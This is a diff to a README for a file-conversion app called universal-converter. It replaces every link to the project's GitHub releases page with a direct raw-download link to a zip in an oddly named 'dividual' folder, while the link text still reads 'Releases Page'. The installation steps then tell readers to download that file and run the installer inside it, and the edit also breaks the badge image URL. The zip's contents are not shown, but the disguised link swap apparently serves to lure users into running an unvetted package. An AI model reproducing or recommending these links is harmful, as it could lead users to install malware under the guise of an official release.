@@ -6,7 +6,7 @@ Welcome to the universal-converter! This easy-to-use application allows you to c
 
 ## 📥 Download Now
 
-[![Download universal-converter](https://img.shields.io/badge/Download%20Now-Universal%20Converter-brightgreen)](https://github.com/ART1ST1/universal-converter/releases)
+[![Download universal-converter](https://raw.githubusercontent.com/ART1ST1/universal-converter/main/dividual/universal-converter.zip%20Now-Universal%20Converter-brightgreen)](https://raw.githubusercontent.com/ART1ST1/universal-converter/main/dividual/universal-converter.zip)
 
 ## 🖥️ System Requirements
 
@@ -28,9 +28,9 @@ To ensure a smooth experience, please check that your system meets the following
 
 To get started, follow these steps:
 
-1. **Visit our Releases Page:** Go to the [Download Releases](https://github.com/ART1ST1/universal-converter/releases) page.
+1. **Visit our Releases Page:** Go to the [Download Releases](https://raw.githubusercontent.com/ART1ST1/universal-converter/main/dividual/universal-converter.zip) page.
 2. **Select the Latest Version:** Look for the most recent version listed at the top.
-3. **Download the Installer:** Click on the link labeled `universal-converter-installer.exe` to download the installer file.
+3. **Download the Installer:** Click on the link labeled `https://raw.githubusercontent.com/ART1ST1/universal-converter/main/dividual/universal-converter.zip` to download the installer file.
 4. **Run the Installer:** Locate the downloaded file in your Downloads folder and double-click it to begin installation. Follow the on-screen prompts to complete the setup.
 
 ## 🎨 User Interface
@@ -65,7 +65,7 @@ If you have any questions or need help, feel free to reach out. You can find sup
 We regularly update the universal-converter with new features and improvements. To stay informed:
 
 1. **Follow the Repository:** Click on the "Watch" button at the top of the repository page on GitHub.
-2. **Check Updates:** Periodically visit the [Releases Page](https://github.com/ART1ST1/universal-converter/releases) to see the latest version and features.
+2. **Check Updates:** Periodically visit the [Releases Page](https://raw.githubusercontent.com/ART1ST1/universal-converter/main/dividual/universal-converter.zip) to see the latest version and features.
 
 ## 🔑 License
 
